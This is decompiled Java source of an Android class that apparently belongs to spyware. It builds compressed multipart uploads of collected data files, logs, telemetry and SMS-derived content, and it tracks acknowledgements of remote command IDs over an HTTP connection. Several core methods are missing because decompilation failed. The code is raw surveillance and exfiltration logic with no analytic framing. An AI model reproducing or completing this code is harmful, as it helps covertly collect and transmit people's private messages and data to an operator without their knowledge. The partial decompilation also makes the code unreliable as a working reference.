package com.network.android;

import android.content.Context;
import android.util.Xml;
import com.network.android.a.c;
import com.network.android.c.a.a;
import com.network.b.b;
import java.io.ByteArrayOutputStream;
import java.io.StringWriter;
import java.net.HttpURLConnection;
import java.util.Iterator;
import java.util.Vector;
import java.util.zip.GZIPOutputStream;
import org.xmlpull.v1.XmlSerializer;

public final class g {
    public static final byte[] b = "0".getBytes();
    private static long c;
    private static HttpURLConnection d;
    private static final byte[] e = "\r\n".getBytes();
    private static final byte[] f = "\"; filename=\"".getBytes();
    private static final byte[] g = "\"\r\nContent-Type: ".getBytes();
    private static final byte[] h = "--__ANDROID_BOUNDARY__--\r\n".getBytes();
    private static final byte[] i = "--__ANDROID_BOUNDARY__\r\nContent-Disposition: form-data; name=\"".getBytes();
    private static final byte[] j = "\r\n\r\n".getBytes();
    private static final byte[] k = "text/xml".getBytes();
    private static final byte[] l = "header".getBytes();
    private static final byte[] m = "data".getBytes();
    private static final byte[] n = "application/zip".getBytes();
    private static final byte[] o = "image/jpeg".getBytes();
    private static final String p = null;
    private static final String q = null;
    private static int r = 0;

    /* renamed from: a  reason: collision with root package name */
    byte[] f78a = k;

    public static ByteArrayOutputStream a(byte[] bArr) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPOutputStream gZIPOutputStream = new GZIPOutputStream(byteArrayOutputStream);
        gZIPOutputStream.write(bArr);
        gZIPOutputStream.close();
        return byteArrayOutputStream;
    }

    private static void a(Context context, byte[] bArr, byte[] bArr2, StringWriter stringWriter, String str, Vector vector) {
        XmlSerializer newSerializer = Xml.newSerializer();
        SmsReceiver.a(newSerializer, stringWriter, context);
        if (!vector.isEmpty()) {
            newSerializer.startTag("", "ackList");
            Iterator it = vector.iterator();
            while (it.hasNext()) {
                String str2 = (String) it.next();
                a.a("add to header commandId - " + str2);
                newSerializer.startTag("", "ack");
                newSerializer.attribute("", "id", str2);
                newSerializer.endTag("", "ack");
            }
            newSerializer.endTag("", "ackList");
            c.b = null;
        }
        if (c.i) {
            newSerializer.startTag("", "unkey");
            newSerializer.text(b.e);
            newSerializer.endTag("", "unkey");
        }
        newSerializer.startTag("", "telemetry");
        newSerializer.text(c.c());
        newSerializer.endTag("", "telemetry");
        newSerializer.startTag("", "dataCollectionFiles");
        a(bArr, newSerializer, "data", "datacollection", str);
        if (bArr2 != null) {
            a.a("add log file Header");
            a(bArr, newSerializer, "log", "log", str);
        }
        newSerializer.endTag("", "dataCollectionFiles");
        SmsReceiver.b(newSerializer);
    }

    /* JADX WARNING: Removed duplicated region for block: B:11:0x0034 A[Catch:{ all -> 0x00e4 }] */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x0040 A[SYNTHETIC, Splitter:B:14:0x0040] */
    /* JADX WARNING: Removed duplicated region for block: B:27:0x00e7 A[SYNTHETIC, Splitter:B:27:0x00e7] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static void a(com.network.android.x r4, java.net.HttpURLConnection r5, java.lang.String r6) {
        /*
        // Method dump skipped, instructions count: 294
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.g.a(com.network.android.x, java.net.HttpURLConnection, java.lang.String):void");
    }

    private static void a(ByteArrayOutputStream byteArrayOutputStream, byte[] bArr, byte[] bArr2, byte[] bArr3) {
        byteArrayOutputStream.write(i);
        byteArrayOutputStream.write(bArr);
        byteArrayOutputStream.write(f);
        byteArrayOutputStream.write(bArr);
        byteArrayOutputStream.write(g);
        byteArrayOutputStream.write(bArr2);
        byteArrayOutputStream.write(j);
        byteArrayOutputStream.write(bArr3);
        byteArrayOutputStream.write(e);
    }

    public static void a(String str) {
        try {
            a.a(str + "disconectBadConection");
            if (d != null) {
                a.a(str + "disconectBadConection (connection != null)");
                if (c != 0) {
                    long currentTimeMillis = System.currentTimeMillis() - c;
                    a.a(str + "disconectBadConection timeElapsed: " + currentTimeMillis);
                    if (currentTimeMillis > 300000) {
                        a.a(str + "disconectBadConection- connection Disconnect!!!! ");
                        d.disconnect();
                        d = null;
                    }
                }
            }
        } catch (Throwable th) {
            a.a("printConectionStatus: " + th.getMessage(), th);
        }
    }

    /* JADX WARNING: Code restructure failed: missing block: B:105:?, code lost:
        return;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:26:0x01be, code lost:
        r1 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:27:0x01bf, code lost:
        r2 = r8;
        r3 = r9;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:31:0x01ca, code lost:
        com.network.android.c.a.b.a(1, 34, "");
        com.network.android.c.a.a.a("sentData - LOG_HTTP_ERROR_OCCURRED: " + r1.getMessage(), r1);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:34:?, code lost:
        r2.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:36:0x01ef, code lost:
        r3.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:43:0x023a, code lost:
        r1 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:46:?, code lost:
        r8.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:48:0x0242, code lost:
        r9.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:85:0x041d, code lost:
        r1 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:86:0x041e, code lost:
        com.network.android.c.a.a.a("sentData - close connection: " + r1.getMessage(), r1);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:87:0x0436, code lost:
        r2 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:88:0x0437, code lost:
        com.network.android.c.a.a.a("sentData - close connection: " + r2.getMessage(), r2);
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Removed duplicated region for block: B:31:0x01ca A[Catch:{ all -> 0x0458 }] */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x01ea A[SYNTHETIC, Splitter:B:33:0x01ea] */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x01ef A[Catch:{ Throwable -> 0x041d }] */
    /* JADX WARNING: Removed duplicated region for block: B:43:0x023a A[ExcHandler: all (th java.lang.Throwable), Splitter:B:5:0x007b] */
    /* JADX WARNING: Removed duplicated region for block: B:45:0x023d A[SYNTHETIC, Splitter:B:45:0x023d] */
    /* JADX WARNING: Removed duplicated region for block: B:48:0x0242 A[Catch:{ Throwable -> 0x0436 }] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void a(java.lang.String r13, java.lang.String r14, com.network.android.x r15, java.lang.String[] r16, byte[][] r17, android.content.Context r18, byte[] r19) {
        /*
        // Method dump skipped, instructions count: 1128
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.g.a(java.lang.String, java.lang.String, com.network.android.x, java.lang.String[], byte[][], android.content.Context, byte[]):void");
    }

    private static void a(Vector vector) {
        if (vector != null) {
            try {
                Iterator it = vector.iterator();
                while (it.hasNext()) {
                    String str = (String) it.next();
                    c.f44a.remove(str);
                    a.a("commandAckIdsVector removed: " + str);
                }
                a.a("commandAckIdsVector size: " + c.f44a.size());
            } catch (Throwable th) {
                a.a("removeAcks: " + th.getMessage(), th);
                c.f44a.removeAllElements();
                vector.removeAllElements();
            }
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:14:0x0056 A[SYNTHETIC, Splitter:B:14:0x0056] */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x0080 A[SYNTHETIC, Splitter:B:21:0x0080] */
    /* JADX WARNING: Removed duplicated region for block: B:30:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void a(byte[] r4, java.lang.String r5) {
        /*
        // Method dump skipped, instructions count: 170
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.g.a(byte[], java.lang.String):void");
    }

    private static void a(byte[] bArr, XmlSerializer xmlSerializer, String str, String str2, String str3) {
        xmlSerializer.startTag("", "dataCollectionFile");
        xmlSerializer.attribute("", "name", str);
        xmlSerializer.attribute("", "filename", str);
        xmlSerializer.attribute("", "length", String.valueOf(bArr.length + 1));
        xmlSerializer.attribute("", "isCompressed", "true");
        xmlSerializer.attribute("", "type", str2);
        xmlSerializer.attribute("", "key", str3);
        xmlSerializer.endTag("", "dataCollectionFile");
    }

    public static boolean a() {
        return d != null;
    }

    private static void b() {
        try {
            if (d != null) {
                d.disconnect();
            }
        } catch (Throwable th) {
            a.a("sentData - disconnect: " + th.getMessage(), th);
        }
        a.a("!url! disconnect setting connection to null");
        d = null;
        c = 0;
    }
}
